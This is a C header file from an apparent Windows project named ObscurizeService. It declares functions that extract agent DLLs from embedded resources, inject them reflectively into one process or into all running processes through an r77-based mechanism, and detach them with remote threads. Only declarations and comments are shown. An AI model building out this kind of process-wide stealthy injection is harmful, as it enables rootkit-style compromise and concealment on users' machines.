#ifndef _OBS_AGENTINJECTOR_H
#define _OBS_AGENTINJECTOR_H

#include <Windows.h>

// ============================================================
//  ObscurizeService – AgentInjector.h
//
//  Loads the ObscurizeAgent DLL bytes from embedded PE
//  resources and injects them reflectively into target
//  processes using the r77api injection mechanism.
// ============================================================

/// <summary>
/// Extracts the 32-bit and 64-bit Agent DLL byte arrays from
/// the service EXE's resource section.  Allocated buffers are
/// returned in the out-parameters; caller must HeapFree them.
/// Returns FALSE if either resource is missing (development build).
/// </summary>
BOOL LoadAgentDllsFromResources(
    LPBYTE *dll32, LPDWORD dll32Size,
    LPBYTE *dll64, LPDWORD dll64Size);

/// <summary>
/// Injects the Agent DLL into the process identified by
/// <paramref name="processId"/>.  Uses the r77 reflective
/// injection path.  Safe to call if already injected
/// (the newly injected DLL detects the header and unloads).
/// </summary>
VOID InjectAgentIntoProcess(DWORD processId);

/// <summary>
/// Enumerates all running processes and calls
/// InjectAgentIntoProcess for each one.
/// </summary>
VOID InjectAgentIntoAllProcesses(VOID);

/// <summary>
/// Walks all processes, finds those carrying the OBS_AGENT_SIGNATURE
/// header, and fires the detach callback via a remote thread.
/// </summary>
VOID DetachAllAgents(VOID);

#endif  // _OBS_AGENTINJECTOR_H
